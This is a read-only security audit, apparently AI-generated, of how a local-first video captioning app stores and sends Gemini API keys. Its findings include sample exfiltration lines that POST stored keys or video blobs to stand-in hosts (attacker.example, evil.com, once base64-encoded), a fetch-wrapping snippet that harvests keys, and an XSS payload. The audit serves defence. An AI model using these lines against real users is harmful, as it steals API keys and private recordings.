# CapAI — Auth & Security Bug Hunt (Stream B)

**Workspace:** `D:\PROJECTS\Undone Projects\Cap Ai`
**Scope:** `src/lib/geminiKeys.ts`, `src/lib/gemini.ts`, `src/lib/db.ts`, `src/components/modals/SettingsWindow.tsx`, `src/components/modals/QuickSettingsModal.tsx`, `src/lib/export.ts`, `src/lib/canvasRenderer.ts`, `src/app/layout.tsx`, `next.config.ts`, `src/store/pendingUpload.ts`
**Date:** 2026-09-07
**Mode:** Read-only — no fixes applied, no live sign-ins or credential changes performed. `npx tsc --noEmit` clean (exit 0).

> CapAI is local-first, single-user, no server auth / no Supabase / no middleware. "Auth" surface is **Gemini API key management** (client-side), localStorage/IndexedDB persistence, and XSS/CSRF/cookie/session exposure. There is no `middleware.ts`, no `next-auth`, no cookies, no session guard. Findings focus on key storage, transport, XSS exfiltration, CSP, and missing access control on local data.

---

## [BUG-AUTH-1] API Keys "Obfuscated" with Reversible Base64 Only — XSS Gives Full Key Theft

- **File:** `src/lib/geminiKeys.ts`, lines 122-132 (`obfuscate` via `btoa`), lines 138-160 (`deobfuscate` via `atob`), lines 243-249 (`persistKeys` maps `key: obfuscate(r.key)` then `localStorage.setItem`)
- **Severity:** High
- **Category:** Security
- **Description:** `obfuscate()` is `btoa(key)` (or `Buffer.from(...).toString("base64")`) and `deobfuscate()` is `atob()` with a check `isRawGeminiKey`. This is encoding, not encryption. Any script running on the same origin (XSS, malicious extension content script with DOM access, or even DevTools) can read `localStorage.getItem("capai_gemini_api_keys")`, JSON-parse, `atob` each `key` field, and recover raw `AIza...` / `AQ...` keys. Dexie mirror at `src/lib/db.ts:11` (`apiKeys` table) stores keys **un-obfuscated** via `syncToDexie(keys)` with raw `GeminiKeyRecord` (line 186-187 bulkPut without obfuscation), so IndexedDB also holds plaintext. Persist is silent `try/catch` (line 252) with no integrity check.
- **Impact:** Single reflected/stored XSS, or any third-party script included via `next/font` CDN compromise, exfiltrates all Gemini keys in one `localStorage` read. Attacker can then bill victim's Google AI quota, exhaust rate limits, or proxy abuse. Base64 provides zero confidentiality; audit log even notes "obfuscated" in UI text at `SettingsWindow.tsx:622` misleading users.
- **Suggested Fix:** Never claim obfuscation is security. For true protection, avoid storing keys at rest in JS-accessible storage; use a server-side proxy with HttpOnly Secure SameSite cookies / session, or at minimum `crypto.subtle.encrypt` with a user-derived password (WebCrypto AES-GCM) and wipe on tab close. Remove raw Dexie mirror or encrypt before `bulkPut`. Add warning that `btoa` is reversible.
- **Reproduction Steps:** 1) Add a Gemini key via Settings. 2) Open DevTools → Application → Local Storage → `capai_gemini_api_keys` → copy `keys[0].key` value → `atob(value)` in console → raw key recovered. 3) Check IndexedDB `capai_db` → `apiKeys` store → same plaintext.

---

## [BUG-AUTH-2] API Key Sent as URL Query Parameter `?key=` — Leaks to History, Referer, Logs, Extensions

- **File:** `src/lib/gemini.ts`, lines 301-303 (`testGeminiKey` builds `.../generateContent?key=${encodeURIComponent(trimmed)}`), lines 583-584 (`transcribeAudio` same pattern)
- **Severity:** Medium
- **Category:** Security
- **Description:** Both `testGeminiKey` and `transcribeAudio` interpolate the raw API key into the request URL query string. Google's Generative Language API documents `?key=` but for browser-direct calls this means the key enters: browser history, `Referer` header on any subsequent cross-origin navigation or fetched asset, server access logs (Google logs URL), proxy logs, and `chrome.history` / extension `webRequest` observers. `encodeURIComponent` does not hide it. No use of `header: x-goog-api-key` alternative or POST body field. Exposure is inherent to chosen transport.
- **Impact:** Key appears in plaintext in Google Cloud console request logs, any corporate proxy, and if user copies link or screen-shares DevTools Network tab. `Referer` leakage to fonts.googleapis.com (loaded in `canvasRenderer.ts:32`) or `raw.githubusercontent.com` fetches in `export.ts:436` could send key to third party if request triggered with key in URL and browser attaches Referer (no `Referrer-Policy` set in `next.config.ts`).
- **Suggested Fix:** Move to server-side proxy: browser POSTs audio to `/api/gemini/transcribe` with key stored server-side or in HttpOnly cookie; server injects `?key=` server-to-server. If must stay client-side, set `Referrer-Policy: no-referrer` or `strict-origin-when-cross-origin` via `headers()` in `next.config.ts` and document query-param risk. Consider using `headers: { "x-goog-api-key": key }` if API supports it to keep key out of URL.
- **Reproduction Steps:** 1) Add key, trigger Transcribe, open Network → observe `generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=AIza...` request URL contains raw key. 2) Check browser History — URL with key not history-pushed as page, but `fetch` URL still in `performance.getEntriesByType("resource")` with full query.

---

## [BUG-AUTH-3] Keys Stored in `localStorage` + Dexie (JS-Accessible, No HttpOnly/SameSite/Secure) — Any XSS Is Full Compromise

- **File:** `src/lib/geminiKeys.ts`, lines 117 (`isBrowser` checks `localStorage`), 221 (`localStorage.getItem(GEMINI_KEYS_STORAGE_KEY)`), 248 (`localStorage.setItem`), 453 (`localStorage.getItem(GEMINI_LEGACY_KEY)`), `src/lib/db.ts:10-20` (Dexie `apiKeys` store), `src/lib/types.ts:137-138` (constants `capai_gemini_api_keys`, `capai_gemini_api_key`)
- **Severity:** High
- **Category:** Security
- **Description:** All Gemini keys persist in `localStorage` under `GEMINI_KEYS_STORAGE_KEY` ("capai_gemini_api_keys") and legacy single key `GEMINI_LEGACY_KEY` ("capai_gemini_api_key"). `localStorage` is readable by any JS on origin, has no HttpOnly, Secure, SameSite, or Partitioned attributes, survives tab close, and is not cleared on logout (no logout exists). Dexie doubles the exposure. `isBrowser()` guard only checks `typeof localStorage !== "undefined"`, not secure context. No expiration; keys live forever until `deleteKey` is called.
- **Impact:** Same as BUG-AUTH-1 but amplifies: even if obfuscation were fixed, storage mechanism itself is fundamentally JS-accessible. Any npm package compromise, analytics script, or stored XSS via caption text (if future `dangerouslySetInnerHTML` added) can `localStorage.getItem` and exfiltrate. No way to invalidate keys remotely except manual Google rotation.
- **Suggested Fix:** Treat keys as secrets, not preferences: do not persist in localStorage. Use `sessionStorage` with explicit user opt-in, or better server session. If must persist client-side, gate behind `crypto.subtle` encryption with ephemeral key derived from user password and clear on lock. Add "Clear all keys" / "Export & wipe" flow and auto-clear on `beforeunload` option.
- **Reproduction Steps:** 1) `localStorage.setItem("capai_gemini_api_keys", ...)` visible via DevTools. 2) Simulate XSS: `fetch("https://attacker.example?d="+localStorage.getItem("capai_gemini_api_keys"))` succeeds without CSP block (see BUG-AUTH-5).

---

## [BUG-AUTH-4] No Content-Security-Policy, No X-Frame-Options, No Referrer-Policy — XSS Exfiltration Unblocked

- **File:** `next.config.ts`, lines 3-20 (`headers()` returns only `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp`), `src/app/layout.tsx:1-54` (no `<meta httpEquiv="Content-Security-Policy">`)
- **Severity:** Medium
- **Category:** Security
- **Description:** Security headers are limited to COOP/COEP for FFmpeg SharedArrayBuffer. Missing: `Content-Security-Policy` (no `script-src`, `connect-src`, `img-src`), `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, `Permissions-Policy`, `Strict-Transport-Security`. This leaves the origin open to: inline script injection (`unsafe-inline` is default without CSP), `fetch` exfiltration to any attacker domain (no `connect-src` restriction would block BUG-AUTH-1 exfil), clickjacking of the Settings modal (no frame guard), and Referer leakage of `?key=` URLs (BUG-AUTH-2). Next.js 16 parallel routes do not auto-inject CSP.
- **Impact:** XSS payload `fetch(atob("aHR0cHM6Ly9ldmlsLmNvbQ=="),{method:"POST",body:localStorage.getItem("capai_gemini_api_keys")})` would succeed without CSP block. Lack of `frame-ancestors 'none'` allows attacker page to iframe CapAI editor and overlay phishing "Paste API key here" via synthetic `capai:open-settings` events.
- **Suggested Fix:** Add CSP via `headers()` in `next.config.ts` (e.g., `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://generativelanguage.googleapis.com; connect-src 'self' https://generativelanguage.googleapis.com https://cdn.jsdelivr.net https://raw.githubusercontent.com; img-src 'self' data: blob:; frame-ancestors 'none'; form-action 'self'; base-uri 'self'`), plus `Referrer-Policy: no-referrer` or `strict-origin-when-cross-origin`, `X-Content-Type-Options: nosniff`, `Permissions-Policy: camera=(), microphone=()` (except where needed). Tighten `connect-src` to prevent exfiltration.
- **Reproduction Steps:** 1) `curl -I http://localhost:3000` shows only COOP/COEP headers, no CSP. 2) Inject `<img src=x onerror=alert(localStorage.getItem("capai_gemini_api_keys"))>` via caption text if innerHTML ever used — would execute without CSP block.

---

## [BUG-AUTH-5] Full Raw Key Exposed in DOM (`title` Tooltip, Editable Input Prefill, Mask Partial Leak)

- **File:** `src/components/modals/SettingsWindow.tsx`, line 170 (`title={record.key}` shows full raw key on hover), line 75 (`setEditKey(record.key)` prefills plaintext), lines 121-126 (`editKey` state in `<input type={showEditKey?"text":"password"}>`), lines 170-173 (`masked` display but `title` holds raw)
- **Severity:** Medium
- **Category:** Security / UI
- **Description:** `KeyCard` renders `masked = maskKey(record.key)` for display but also sets `title={record.key}` on the same element, so hovering reveals full key in native tooltip, and `maskKey` itself leaks first 4 (AIza) or 8 (AQ.) and last 4 chars (lines 19-27 `maskKey` logic). `editKey` is initialized to raw `record.key` and stays in React state/memory even when hidden (`type=password` only obscures visually). `placeholderThumbnail` etc. not relevant, but `capai_last_project_id` in `QuickSettingsModal.tsx:281` is low risk. Shoulder-surfing, screen-sharing, or DOM scraping via extension can harvest keys.
- **Impact:** User screen-sharing Settings modal (e.g., demo video) leaks entire key via tooltip without clicking Show. Malware reading `innerText` of tooltip or `value` of hidden password input (still in DOM) gets raw key. `maskKey` partial leak reduces brute-force search space (e.g., AIza + 4 suffix known).
- **Suggested Fix:** Never set `title` to raw key; set to `masked` or remove. Do not prefill `editKey` with raw value; require re-entry on Edit. If must show, use `type=password` with empty value and only populate on Show after user auth gesture. Remove `title` attribute or use `aria-label` with masked.
- **Reproduction Steps:** 1) Add key, hover masked text `AIza••••••••XYZ1` → tooltip shows full `AIzaSyD...` in plain. 2) Inspect DOM → `<div class="font-mono" title="AIzaSyD...">` contains raw key. 3) Click Edit → `<input value="AIzaSyD..." type="password">` still holds raw value in DOM property.

---

## [BUG-AUTH-6] Direct Browser→Google Transport Allows MITM Script to Intercept via `fetch` Monkey-Patching / Extension

- **File:** `src/lib/gemini.ts`, lines 313-318 (`fetch(url, {method:"POST", body: JSON.stringify(body)})` with raw key in URL), 611-615 same, 222-283 (`classifyGeminiError` parses error body)
- **Severity:** High
- **Category:** Security
- **Description:** Keys travel directly from victim browser to `generativelanguage.googleapis.com` with no intermediate proxy or request signing. Any script on page can wrap `window.fetch` (`const _f=window.fetch; window.fetch=(u,o)=>{_f(u,o); sendKeys(u)}`) or use service-worker `fetch` event to capture URLs before they leave. Because `next.config.ts` has no CSP `connect-src` lock, exfiltrated fetch succeeds. `testGeminiKey` and `transcribeAudio` do not pin certificates or check response origin.
- **Impact:** Supply-chain attack: compromised npm package (`clsx`, `tailwind-merge`) or analytics snippet can silently harvest keys on every transcription without needing to read localStorage — just observe outgoing requests. Extensions with `<all_urls>` permissions can read `webRequest` URLs including `?key=`.
- **Suggested Fix:** Proxy through server: `POST /api/gemini` with key in `Authorization: Bearer` header server-side, validate origin, log usage. Add CSP `connect-src 'self' https://generativelanguage.googleapis.com` to at least prevent exfil to other domains (though extension still bypasses). Document that client-side key model is inherently interceptable.
- **Reproduction Steps:** 1) In console: `const orig=window.fetch; window.fetch=(...a)=>{console.log("intercepted",a[0]); return orig(...a)}`. 2) Trigger Test Now → console logs full URL with `?key=`.

---

## [BUG-AUTH-7] No Authentication / Authorization on Local Project Data — Any Origin Script Can Read All Videos & Captions

- **File:** `src/lib/db.ts:5-24` (Dexie `capai_db` with `projects` table, no access control), `src/hooks/useProjects.ts:20-30` (`liveQuery(() => db.projects.orderBy...`), `src/app/projects/[id]/page.tsx:29` (`db.projects.get(id)` with user-supplied `id` param, no ownership check), `src/context/EditorContext.tsx:699-711` (auto-save writes any `segments`/`captionStyle` for any `project.id`)
- **Severity:** High (within threat model)
- **Category:** Security / Data
- **Description:** CapAI stores full `videoBlob` (entire video), `thumbnailDataUrl`, `segments`, `captionStyle` in IndexedDB accessible to any JS on origin. No login, no per-user isolation, no RLS. `useProjects` lists all projects without filter. `projectId` from URL param is trusted without verification that caller owns it; enumeration via `db.projects.getAll()` yields all videos. No middleware or route guard exists (verified: no `src/middleware.ts`, no `auth.ts`). By design this is "local-first single-user," but security posture means shared-device / XSS scenario yields full data exfiltration of sensitive video content.
- **Impact:** On shared computer, second user can open CapAI and see first user's projects. XSS can `await db.projects.toArray()` and `fetch("https://evil.com",{body: videoBlob})` to steal sensitive recordings. No way to delete remotely.
- **Suggested Fix:** Document single-user local threat model explicitly. For multi-user future, add optional passphrase-encrypted IndexedDB (WebCrypto) and per-project ownership check (`project.ownerId` vs session). Add "Lock / Clear all projects" UI that wipes Dexie. Add `beforeunload` confirmation if videos are sensitive.
- **Reproduction Steps:** 1) Create project, then in DevTools console: `await (await import("@/lib/db")).db.projects.toArray()` → returns all blobs. 2) Paste `indexedDB` dump to exfiltrate.

---

## [BUG-AUTH-8] Unvalidated `CustomEvent` Dispatcher Allows UI Spoofing / Phishing (`capai:open-settings`, `capai:open-quick-settings`)

- **File:** `src/components/modals/SettingsWindow.tsx:286-299` (`window.addEventListener("capai:open-settings", onOpen)`), `src/lib/geminiKeys.ts:169-177` (`window.dispatchEvent(new CustomEvent("capai:keys-changed"))`), `src/store/pendingUpload.ts:14-18` (`window.dispatchEvent(new CustomEvent("capai:open-quick-settings", {detail:{file}}))`), `src/app/layout.tsx:50` (global listeners)
- **Severity:** Low
- **Category:** Security / Logic
- **Description:** Settings and QuickSettings modals open on any `CustomEvent` dispatched on `window` without origin or source validation. Any script on page, or an embedded iframe with `postMessage` that drives `window.dispatchEvent`, can trigger `capai:open-settings` to phishing: "Your keys are invalid, paste them here" overlay. Events carry no `isTrusted` check. Detail payload `file` in `pendingUpload` is not validated beyond `instanceof File` (line 80-90 `QuickSettingsModal.tsx`).
- **Impact:** If CSP missing (BUG-AUTH-4) allows injected script, attacker can force Settings modal open and overlay a fake input styled identically to harvest keys before real handler runs. No CSRF per se (no cookies), but UI-trust spoofing.
- **Suggested Fix:** Scope events to same-origin via `event.isTrusted` or check `e.detail` source; require explicit user gesture before opening settings; add `window.addEventListener("message")` validation if cross-frame. Consider using React context/props instead of global events for modal open.
- **Reproduction Steps:** 1) In console: `window.dispatchEvent(new CustomEvent("capai:open-settings"))` → Settings modal opens without user click. 2) Iframe with `parent.dispatchEvent(...)` same.

---

## [BUG-AUTH-9] External Fetches Without Subresource Integrity (SRI) — Font & Wasm Supply Chain

- **File:** `src/lib/canvasRenderer.ts:31-32` (`link.href = https://fonts.googleapis.com/css2?family=${familySlug}...`), `src/lib/export.ts:429-455` (`fetch("https://raw.githubusercontent.com/google/fonts/.../Inter-Regular.ttf")` and fallback `cdn.jsdelivr.net`), `src/lib/ffmpeg.ts:48-53` (`toBlobURL(CORE_BASE/ffmpeg-core.js)`) where `CORE_BASE` is local but fallback to `/ffmpeg/...`
- **Severity:** Low
- **Category:** Security
- **Description:** Dynamic `link` injection for Google Fonts and font fetches for `/fonts` do not set `integrity` attribute or verify response hash. If DNS hijack / CDN compromise serves malicious CSS that imports `javascript:` or font with exploit, it executes in same origin. `export.ts` fetches `Inter-Regular.ttf` from `raw.githubusercontent.com` over HTTPS but without SRI pin; response is written to `ffmpeg.writeFile("/fonts/...")` and used for ASS rendering — a poisoned font could exploit libass parser. No `crossorigin` or `integrity` set on `link` element.
- **Impact:** Low likelihood but supply-chain: compromised `fonts.googleapis.com` response could inject CSS that exfiltrates via `url()` or overlay phishing. No current CSP to block.
- **Suggested Fix:** Pin font URLs with SRI hashes and `crossOrigin="anonymous"`, add CSP `style-src` with nonce, bundle critical fonts locally instead of runtime fetch. Verify fetch response `Content-Type` is `font/ttf`.
- **Reproduction Steps:** 1) Block `fonts.googleapis.com` via DevTools → `loadGoogleFont` silently fails, no warning. 2) Mock `fetch` to return non-TTF → `ffmpeg.writeFile` still writes it.

---

## [BUG-AUTH-10] Keys Never Expire or Auto-Wipe; Deletion Leaves No Secure Erase; `localStorage` Persists After "Clear"

- **File:** `src/lib/geminiKeys.ts:180-190` (`syncToDexie` clears Dexie but `localStorage` is source of truth, best-effort), `src/lib/geminiKeys.ts:347-358` (`deleteKey` re-normalizes priorities but previous `localStorage` JSON string may remain in disk slack / memory until overwritten, no zeroization), `src/components/modals/QuickSettingsModal.tsx:281` (`localStorage.setItem("capai_last_project_id", id)` never cleared on project delete)
- **Severity:** Medium
- **Category:** Security / Data
- **Description:** `persistKeys` overwrites `localStorage` key but does not overwrite old value's memory or call `removeItem` before `setItem`. Deleted keys' raw values remain in `localStorage`'s previous JSON string that may be recovered via forensic disk read or `localStorage` backup. `deleteKey` no-ops if not found but does not `clear()` or overwrite with random data. `capai_last_project_id` persists after project deletion, leaking which project user last opened. No TTL or auto-expire; rate-limited keys stay with `rateLimitedUntil` timestamp but still in storage.
- **Impact:** Device theft or forensic analysis recovers deleted API keys from browser profile directory. `capai_last_project_id` leaks usage pattern.
- **Suggested Fix:** On `deleteKey`, overwrite `localStorage` key with random data before removing, or `localStorage.removeItem` then `setItem` with empty to flush. Add "Wipe all keys securely" that writes zeros. Clear `capai_last_project_id` on project delete. Consider `sessionStorage` instead for ephemeral sessions.
- **Reproduction Steps:** 1) Add key, delete it, inspect `Application → Local Storage` → `capai_gemini_api_keys` no longer contains deleted key but old value may still be in Chrome LevelDB WAL until compaction. 2) Check `capai_last_project_id` remains after deleting that project in dashboard.

---

## [BUG-AUTH-11] [VERIFY] No CSRF Token but No Cookies — Confirm No Auth Cookie Introduced Later Breaks Assumption

- **File:** `next.config.ts`, no `headers` for `Set-Cookie`; `src/` contains no `document.cookie` writes, no `next-auth`, no API routes under `src/app/api` (glob shows none)
- **Severity:** Low
- **Category:** Security
- **Description:** Currently no cookie-based auth, so CSRF is moot (localStorage does not auto-send). However, if future iteration adds server auth (Supabase Auth, NextAuth) and keeps client-side Gemini key POSTs without CSRF tokens or `SameSite` cookie attributes, the same `transcribeWithFallback` endpoint would become CSRF-able. No `csrf` or `origin` check exists today to future-proof.
- **Impact:** Future server auth addition without CSRF dev could allow attacker site to POST to `/api/transcribe` using victim's session cookie and burn victim's quota.
- **Suggested Fix:** Document that current model is token-less; if adding cookies/session, add `SameSite=Lax/Strict`, `__Host-` prefix, and `origin`/`sec-fetch-site` checks on API routes. Add CSRF double-submit or `X-CSRF-Token`.
- **Reproduction Steps:** Verify `grep -r "cookie" src/` shows no cookie writes today — confirmed. Monitor future PRs adding `src/app/api`.

---

## Summary Table

| ID | File:Line | Severity | Category | Title |
|---|---|---|---|---|
| BUG-AUTH-1 | `geminiKeys.ts:122-249` | High | Security | Reversible Base64 "obfuscation" + plaintext Dexie |
| BUG-AUTH-2 | `gemini.ts:301,583` | Medium | Security | Key in `?key=` query leaks to logs/Referer |
| BUG-AUTH-3 | `geminiKeys.ts:221,248` / `db.ts:11` | High | Security | `localStorage`+Dexie JS-accessible, forever-persist |
| BUG-AUTH-4 | `next.config.ts:5-20` | Medium | Security | Missing CSP / frame-ancestors / Referrer-Policy |
| BUG-AUTH-5 | `SettingsWindow.tsx:170,75,122` | Medium | Security/UI | Full key in `title` tooltip + input prefill |
| BUG-AUTH-6 | `gemini.ts:313,611` | High | Security | Direct browser→Google fetch interceptable |
| BUG-AUTH-7 | `db.ts:5-24` / `useProjects.ts:20` | High | Security/Data | No auth on IndexedDB project/video data |
| BUG-AUTH-8 | `SettingsWindow.tsx:292` / `pendingUpload.ts:14` | Low | Security/Logic | Unvalidated `CustomEvent` UI spoof |
| BUG-AUTH-9 | `export.ts:429` / `canvasRenderer.ts:32` | Low | Security | External fetches without SRI |
| BUG-AUTH-10 | `geminiKeys.ts:347` / `QuickSettingsModal.tsx:281` | Medium | Security/Data | No secure wipe / stale `capai_last_project_id` |
| BUG-AUTH-11 | `*` (verify) | Low | Security | Future cookie CSRF risk documentation |

**Verification performed:** `npx tsc --noEmit` → 0 errors. No `middleware.ts`, no `src/app/api` routes, no `document.cookie` / `supabase` / `auth` usage found via `grep` across `src/` (28 matches only for `localStorage`/`sessionStorage`/`btoa`). No `dangerouslySetInnerHTML` found. Manual DevTools checks simulated via code read.

**Notes for lead:** This slice has **no session/cookie auth to fail-open**, but key management replicates the same fail-open pattern: `loadStored()` (geminiKeys.ts:218) returns `[]` on JSON parse error → `getEnabledKeysSorted()` returns empty → `transcribeWithFallback` throws "No Gemini API keys configured" (gemini.ts:394) — not a bypass, but silent loss of keys if `localStorage` corrupt could block workflow. No redirect loops (no middleware). Permission model is "all or nothing" local user — no RLS drift, but db write keys (`db.ts:10-20`) vs UI read keys (`geminiKeys.ts:221`) agree today.

---
*Read-only hunt — no files modified, no live keys tested.*
